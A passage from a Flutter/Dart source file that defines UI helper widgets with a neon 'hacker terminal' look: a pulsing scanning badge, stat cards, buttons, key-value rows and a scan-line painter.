  Widget _rbadge() => AnimatedBuilder(animation: _pulse, builder: (_, __) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
    decoration: BoxDecoration(color: cG.withOpacity(0.06), borderRadius: BorderRadius.circular(2),
      border: Border.all(color: cG.withOpacity(0.4)),
      boxShadow: [BoxShadow(color: cG.withOpacity(_pulse.value * 0.25), blurRadius: 12)]),
    child: Row(mainAxisSize: MainAxisSize.min, children: [
      Container(width: 6, height: 6, decoration: BoxDecoration(shape: BoxShape.circle, color: cG,
        boxShadow: [BoxShadow(color: cG.withOpacity(_pulse.value), blurRadius: 8)])),
      const SizedBox(width: 6),
      const Text('SCANNING', style: TextStyle(fontSize: 9, color: cG, letterSpacing: 3,
        fontWeight: FontWeight.bold, fontFamily: 'monospace',
        shadows: [Shadow(color: cG, blurRadius: 8)])),
    ]),
  ));

  Widget _statCard(String label, String val, Color c) => Container(
    padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 6),
    decoration: BoxDecoration(color: c.withOpacity(0.05), borderRadius: BorderRadius.circular(2),
      border: Border.all(color: c.withOpacity(0.3)),
      boxShadow: [BoxShadow(color: c.withOpacity(0.1), blurRadius: 10)]),
    child: Column(children: [
      Text(val, style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold, color: c,
        fontFamily: 'monospace', shadows: [Shadow(color: c, blurRadius: 15)])),
      Text(label, style: TextStyle(fontSize: 8, color: c.withOpacity(0.6), letterSpacing: 2, fontFamily: 'monospace')),
    ]),
  );

  Widget _bigStatCard(String label, String val, Color c) => Container(
    padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 10),
    decoration: BoxDecoration(color: c.withOpacity(0.06), borderRadius: BorderRadius.circular(3),
      border: Border.all(color: c.withOpacity(0.3)),
      boxShadow: [BoxShadow(color: c.withOpacity(0.12), blurRadius: 15)]),
    child: Column(children: [
      Text(val, style: TextStyle(fontSize: 28, fontWeight: FontWeight.bold, color: c,
        fontFamily: 'monospace', letterSpacing: -1,
        shadows: [Shadow(color: c, blurRadius: 20)])),
      const SizedBox(height: 3),
      Text(label, style: TextStyle(fontSize: 9, color: c.withOpacity(0.6),
        letterSpacing: 3, fontFamily: 'monospace')),
    ]),
  );

  Widget _hackerBtn(String label, {required Color c, required VoidCallback onTap}) =>
    GestureDetector(onTap: onTap, child: Container(
      width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 13),
      margin: const EdgeInsets.only(bottom: 5),
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [c.withOpacity(0.05), c.withOpacity(0.12)]),
        borderRadius: BorderRadius.circular(2),
        border: Border.all(color: c.withOpacity(0.5)),
        boxShadow: [BoxShadow(color: c.withOpacity(0.15), blurRadius: 15)]),
      child: Text(label, textAlign: TextAlign.center,
        style: TextStyle(color: c, fontSize: 12, fontWeight: FontWeight.bold,
          letterSpacing: 3, fontFamily: 'monospace',
          shadows: [Shadow(color: c, blurRadius: 10)]))));

  Widget _dBtn(String label, Color c, VoidCallback onTap) =>
    GestureDetector(onTap: onTap, child: Container(
      width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 10),
      margin: const EdgeInsets.only(bottom: 5),
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [c.withOpacity(0.05), c.withOpacity(0.12)]),
        borderRadius: BorderRadius.circular(2),
        border: Border.all(color: c.withOpacity(0.5)),
        boxShadow: [BoxShadow(color: c.withOpacity(0.12), blurRadius: 10)]),
      child: Text(label, textAlign: TextAlign.center,
        style: TextStyle(color: c, fontSize: 11, fontWeight: FontWeight.bold,
          letterSpacing: 2, fontFamily: 'monospace'))));

  Widget _miniBtn(String label, Color c, VoidCallback onTap) =>
    GestureDetector(onTap: onTap, child: Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
      decoration: BoxDecoration(color: c.withOpacity(0.08), borderRadius: BorderRadius.circular(2),
        border: Border.all(color: c.withOpacity(0.4))),
      child: Text(label, textAlign: TextAlign.center,
        style: TextStyle(color: c, fontSize: 10, fontWeight: FontWeight.bold,
          letterSpacing: 1.5, fontFamily: 'monospace'))));

  Widget _credRow(String key, String val, Color c) => Padding(
    padding: const EdgeInsets.only(bottom: 4),
    child: Row(children: [
      Text('$key:', style: TextStyle(fontSize: 10, color: cDg, fontFamily: 'monospace', letterSpacing: 1)),
      const SizedBox(width: 8),
      Expanded(child: Text(val, style: TextStyle(fontSize: 10, color: c, fontFamily: 'monospace',
        shadows: [Shadow(color: c.withOpacity(0.5), blurRadius: 6)]),
        overflow: TextOverflow.ellipsis)),
    ]),
  );

  Widget _dCredRow(String key, String val, Color c) => Padding(
    padding: const EdgeInsets.only(bottom: 3),
    child: Row(children: [
      Text('$key: ', style: TextStyle(fontSize: 9, color: cDg, fontFamily: 'monospace')),
      Expanded(child: Text(val, style: TextStyle(fontSize: 9, color: c, fontFamily: 'monospace',
        shadows: [Shadow(color: c.withOpacity(0.5), blurRadius: 4)]),
        overflow: TextOverflow.ellipsis)),
    ]),
  );

  Widget _termBadge(String text, Color c) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 3),
    decoration: BoxDecoration(color: c.withOpacity(0.08), borderRadius: BorderRadius.circular(2),
      border: Border.all(color: c.withOpacity(0.3))),
    child: Text(text, style: TextStyle(fontSize: 9, color: c, fontFamily: 'monospace', letterSpacing: 0.5)));

  Widget _paramBox(String label, String val, Color c) => Container(
    padding: const EdgeInsets.all(8),
    decoration: BoxDecoration(color: c.withOpacity(0.05), borderRadius: BorderRadius.circular(2),
      border: Border.all(color: c.withOpacity(0.25))),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text(label, style: TextStyle(fontSize: 8, color: cDg.withOpacity(0.8),
        fontFamily: 'monospace', letterSpacing: 1.5)),
      const SizedBox(height: 3),
      Text(val, style: TextStyle(fontSize: 11, color: c, fontWeight: FontWeight.bold,
        fontFamily: 'monospace', shadows: [Shadow(color: c.withOpacity(0.5), blurRadius: 6)])),
    ]));

  Widget _panelStat(String label, String val, Color c) => Column(children: [
    Text(val, style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: c,
      fontFamily: 'monospace', shadows: [Shadow(color: c, blurRadius: 10)])),
    Text(label, style: TextStyle(fontSize: 8, color: c.withOpacity(0.6),
      fontFamily: 'monospace', letterSpacing: 1)),
  ]);

  Widget _dParamBox(String label, String val, Color c) => Container(
    padding: const EdgeInsets.all(6),
    decoration: BoxDecoration(color: c.withOpacity(0.05), borderRadius: BorderRadius.circular(2),
      border: Border.all(color: c.withOpacity(0.2))),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text(label, style: TextStyle(fontSize: 8, color: cDg.withOpacity(0.7),
        fontFamily: 'monospace', letterSpacing: 1)),
      const SizedBox(height: 2),
      Text(val, style: TextStyle(fontSize: 10, color: c, fontWeight: FontWeight.bold,
        fontFamily: 'monospace')),
    ]));

  Widget _dPanelStat(String label, String val, Color c) => Row(children: [
    Text('$label:', style: TextStyle(fontSize: 9, color: cDg, fontFamily: 'monospace')),
    const SizedBox(width: 4),
    Text(val, style: TextStyle(fontSize: 10, color: c, fontWeight: FontWeight.bold,
      fontFamily: 'monospace', shadows: [Shadow(color: c, blurRadius: 6)])),
  ]);

  Widget _dsecTitle(String t) => Row(children: [
    Container(width: 2, height: 10, color: cG, margin: const EdgeInsets.only(right: 6)),
    Text(t, style: TextStyle(fontSize: 9, color: cG.withOpacity(0.7),
      fontFamily: 'monospace', letterSpacing: 3, fontWeight: FontWeight.bold)),
  ]);
}

class _ScanLinePainter extends CustomPainter {
  final double p;
  _ScanLinePainter(this.p);
  @override
  void paint(Canvas canvas, Size size) {
    final y = size.height * p;
    final paint = Paint()..shader = LinearGradient(colors: [
      Colors.transparent, cG.withOpacity(0.04), cG.withOpacity(0.08),
      cG.withOpacity(0.04), Colors.transparent,
    ], stops: const [0, 0.3, 0.5, 0.7, 1]).createShader(Rect.fromLTWH(0, y-40, size.width, 80));
    canvas.drawRect(Rect.fromLTWH(0, y-40, size.width, 80), paint);
  }
  @override
  bool shouldRepaint(_ScanLinePainter old) => old.p != p;
}
